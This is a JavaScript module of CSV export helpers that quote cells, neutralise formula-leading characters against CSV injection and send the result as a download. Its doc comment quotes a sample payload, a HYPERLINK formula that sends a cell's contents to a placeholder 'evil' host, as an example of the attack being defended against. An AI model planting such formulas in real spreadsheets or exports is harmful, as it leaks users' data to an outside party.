/**
 * The one CSV writer for every export. Each cell is quoted, embedded quotes are
 * doubled (so a value can never break out of its cell or add columns), and a
 * value starting with = + - @ (or a tab / carriage return) is prefixed with a
 * single quote so a spreadsheet never evaluates it as a formula (CSV / formula
 * injection, e.g. a company name of `=HYPERLINK("http://evil/?"&A1)`).
 */
export function csvCell(value) {
  let s = String(value ?? '');
  if (/^[=+\-@\t\r]/.test(s)) s = `'${s}`;
  return `"${s.replace(/"/g, '""')}"`;
}

/** Rows (arrays of cells, header first) → CSV text with CRLF line endings. */
export const toCsv = (rows) => rows.map((row) => row.map(csvCell).join(',')).join('\r\n');

/** Send `rows` as a UTF-8 CSV download (BOM so Excel reads non-ASCII names correctly). */
export function sendCsv(res, filename, rows) {
  res.setHeader('Content-Type', 'text/csv; charset=utf-8');
  res.setHeader('Content-Disposition', `attachment; filename="${String(filename).replace(/[^\w.-]/g, '_')}"`);
  res.setHeader('Cache-Control', 'no-store');
  return res.send(`﻿${toCsv(rows)}`);
}
